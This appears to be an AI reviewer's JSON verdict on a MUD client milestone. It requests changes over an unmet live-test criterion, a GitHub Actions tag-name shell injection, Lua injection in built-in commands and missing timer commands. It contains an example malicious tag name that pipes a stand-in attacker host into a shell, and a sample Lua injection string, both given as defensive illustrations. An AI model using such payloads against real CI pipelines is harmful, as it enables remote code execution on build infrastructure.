@@ -1,0 +1,52 @@
+{
+  "milestone": "M3",
+  "commit": "b2632a80ad1a5b47d4d77bb954cdc2641180d74c",
+  "verdict": "REQUEST_CHANGES",
+  "exit_commands": [
+    { "command": "cmake --preset release && cmake --build --preset release", "exit_code": 0 },
+    { "command": "ctest --preset release --output-on-failure", "exit_code": 0 },
+    { "command": "cmake --preset asan && cmake --build --preset asan && ctest --preset asan", "exit_code": 0 },
+    { "command": "./build/release/bench/trigger_bench --min-lines-per-sec 2000", "exit_code": 0 },
+    { "command": "replay_zombiemud (ctest, both presets, verified in CI on Linux and Windows)", "exit_code": 0 },
+    { "command": "one successful live run of tests/live/zombiemud.lua against zombiemud.org:3000", "exit_code": -1 }
+  ],
+  "findings": [
+    {
+      "id": "M3-F1",
+      "severity": "blocking",
+      "category": "spec-deviation",
+      "location": "tests/live/zombiemud.lua:1-24; tests/replay/zombiemud_session.jsonl; HANDOFF.md 'Known limitation -- synthetic live-test fixture'",
+      "description": "tests/live/zombiemud.lua and tests/replay/zombiemud_session.jsonl are not built from a real recorded session against zombiemud.org:3000, and no live run against the real server has ever succeeded (or been attempted end-to-end) for this milestone. SPEC.md section 5 requires the live-test script's patterns to be 'determine[d] from a real recorded session, and quote the transcript lines each is based on in NOTES.md'; the header comment here instead quotes lines from an uncommitted local mock server. SPEC.md's M3 exit criteria are explicit: 'M2 commands, plus replay test green on Linux and Windows CI, plus one successful live run.' The replay test is genuinely green (verified independently, see exit_commands), but the live run has not happened at all. HANDOFF.md itself states this plainly: 'I don't consider this milestone's live-test exit criterion (\"plus one successful live run\") satisfied until that happens.' The Builder's environment blocks outbound TCP to zombiemud.org:3000; I independently confirmed the same block from the Critic's own environment (a Python socket.connect to zombiemud.org:3000 timed out, and this session's own network-policy documentation confirms this host is not on the allowed list and can only be changed by the human via environment settings) -- so this is a genuine, verified environmental constraint, not a fabricated excuse. That verification changes *why* the criterion is unmet, but not *whether* it is met: SPEC.md's own milestone-completion rule is 'A milestone is complete only when every exit command exits 0 on a clean checkout ... and the Critic has issued APPROVE,' and this exit command has not been run, let alone passed. Everything else about the live-test mechanism (fake_mud, the replay ctest, live-test.yml's structure, the unreachable-server skip logic) is real, well-built, and does not need to be redone -- only the fixture's provenance and an actual successful live run remain outstanding. I considered APPROVE-with-documented-finding (the Builder's own suggested resolution) but rejected it: this is not a subtle or arguable gap I am choosing to elevate -- it is a named, spec-mandated exit criterion, already admitted by the Builder as unmet, and approving now would let v0.1.0 be tagged (PROTOCOL.md step 6) and released without the milestone's named 'testing' deliverable (a real live-server validation) ever having occurred.",
+      "evidence": "python3 socket.create_connection((\"zombiemud.org\", 3000), timeout=8) from this Critic's own environment: TimeoutError: timed out (reproduced once, respecting the 'max 5 connections, 60s apart' budget since it was the only connection attempt this round). Confirmed via this session's own environment.network documentation that the host is denied by network policy and only a human can add it to the allowed domains. HANDOFF.md's own 'Known limitation' section (lines 178-217) documents the same block from the Builder's side and explicitly declines to claim the live-test exit criterion is satisfied.",
+      "spec_ref": "docs/SPEC.md section 5, 'Live test: tests/live/zombiemud.lua' (real-recording + traceability requirement) and 'Milestones' ('M3 ... Exit: M2 commands, plus replay test green on Linux and Windows CI, plus one successful live run.')"
+    },
+    {
+      "id": "M3-F2",
+      "severity": "major",
+      "category": "security",
+      "location": ".github/workflows/release.yml:56-67 ('Compute version from tag' / 'Configure' steps)",
+      "description": "The 'Configure' step passes the tag-derived version straight from a GitHub Actions expression into a `run:` shell script: `cmake --preset release -DMUDCLIENT_VERSION_OVERRIDE=${{ steps.version.outputs.version }}`. SPEC.md's workflow-security section is explicit: 'Pass untrusted input (branch names, PR titles) via env:, never interpolated into run:.' A pushed tag name is exactly this class of input -- release.yml triggers on any `v*.*.*` tag, and the glob match still permits shell metacharacters elsewhere in the ref name (e.g. a tag literally named `v1.0.0$(curl attacker.example|sh)` matches `v*.*.*`). Anyone able to push a tag to the repository (not necessarily anyone able to merge to `main`, depending on branch/tag protection) can inject arbitrary shell into this step. The rest of the same file gets this right: the 'Create GitHub Release' step passes `LIVE_TEST_PASSED` via `env:` and uses `${GITHUB_REF_NAME}` (a shell variable reference, not a `${{ }}` template substitution) for the release title/tag -- so the safe pattern was clearly known and used elsewhere in the same file, just missed here. Practical blast radius is limited (the `build` job only carries the default `contents: read` permission, per the workflow-level `permissions:` block, so a successful injection could not push code or elevate privileges by itself), but it is still a concrete, reproducible violation of an explicit, spec-mandated rule in exactly the area CRITIC.md calls out for special attention.",
+      "evidence": "Read .github/workflows/release.yml lines 56-67: `id: version; run: echo \"version=${GITHUB_REF_NAME#v}\" >> \"$GITHUB_OUTPUT\"` followed by `run: cmake --preset release -DMUDCLIENT_VERSION_OVERRIDE=${{ steps.version.outputs.version }}` -- the second run: block substitutes an Actions expression directly into shell text rather than reading it from an env: var. Contrast with the same file's 'Create GitHub Release' step, which does this correctly (`env: LIVE_TEST_PASSED: ${{ needs.live-test.outputs.passed }}`, then `if [ \"$LIVE_TEST_PASSED\" = \"true\" ]` in run:).",
+      "spec_ref": "docs/SPEC.md section 7, 'Workflow security': 'Pass untrusted input (branch names, PR titles) via env:, never interpolated into run:.'"
+    },
+    {
+      "id": "M3-F3",
+      "severity": "minor",
+      "category": "correctness",
+      "location": "src/main.cpp:157-163 (BuiltinCommand::TimerAdd) and the other AliasAdd/TriggerAdd/Del/Kill/Pause/Resume cases in handle_builtin()",
+      "description": "Built-in commands are dispatched by synthesizing a Lua source string and running it via engine.run_string(). Free-form or numeric arguments that aren't run through lua_quote() (e.g. TimerAdd's seconds argument, cmd.args[0], and every *Del/*Kill/*Pause/*Resume's bare id/label argument) are spliced into that source unescaped. A single command-parser token containing Lua syntax (parentheses, quotes, a semicolon) in one of these positions runs as Lua rather than being treated as a literal value -- e.g. `#timer add 1);client.echo('x');( 5` (using command_parser's quoting to make that whole thing one token) executes the injected code. This is self-inflicted (only the interactive user's own typed input reaches this path; command_parser output is never combined with alias-expanded or network-derived text before hitting handle_builtin), so it is not a privilege boundary crossing the way a sandbox escape would be, but it's an injection-hygiene gap in the built-in command surface worth closing (parameterize via a captured local rather than string concatenation, or validate/escape every splice point, not just the ones already covered).",
+      "evidence": "Read src/main.cpp's handle_builtin(): lua_quote() wraps cmd.args[1] (the AliasAdd/TriggerAdd expansion text) but TimerAdd's cmd.args[0] (seconds) and every *Del/*Kill/*Pause/*Resume id/label argument are concatenated into the Lua source directly, e.g. `\"client.register_timer(\" + cmd.args[0] + \", function() ...\"`.",
+      "spec_ref": "docs/agents/CRITIC.md 'Lua' guidance (sandbox escape surface); no direct SPEC.md citation since command_parser's built-in dispatch mechanism is an implementation choice, not spec-mandated."
+    },
+    {
+      "id": "M3-F4",
+      "severity": "minor",
+      "category": "spec-deviation",
+      "location": "src/main.cpp:164-166,173-175 (BuiltinCommand::TimerList, BuiltinCommand::TimerReset)",
+      "description": "SPEC.md section 3 lists `#timer list` and `#timer pause|resume|reset|kill <id|label>` as required built-in commands. `#timer list` prints a placeholder ('use client.on/register_timer return values to track individual timers') instead of an actual listing, and `#timer reset` prints a 'not yet wired' message instead of calling a reset primitive -- there is no `client.reset_timer` Lua binding at all (only pause_timer/resume_timer/kill_timer are exposed). Neither is exercised by any test. This is already disclosed by the Builder in HANDOFF.md's 'Known limitations' section as a real, noticed-late gap, not a silent omission, and doesn't affect anything else the milestone depends on.",
+      "evidence": "Read src/main.cpp cases BuiltinCommand::TimerList and BuiltinCommand::TimerReset; grepped include/mudclient/script_engine.hpp's install_client_api()-exposed client.* functions and confirmed no reset_timer binding exists.",
+      "spec_ref": "docs/SPEC.md section 3, 'Built-in commands': '#timer add ... #timer list, #timer pause|resume|reset|kill <id|label>'"
+    }
+  ],
+  "disputes_adjudicated": []
+}
